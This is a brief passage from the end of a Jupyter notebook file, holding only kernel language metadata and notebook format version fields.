      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 5
}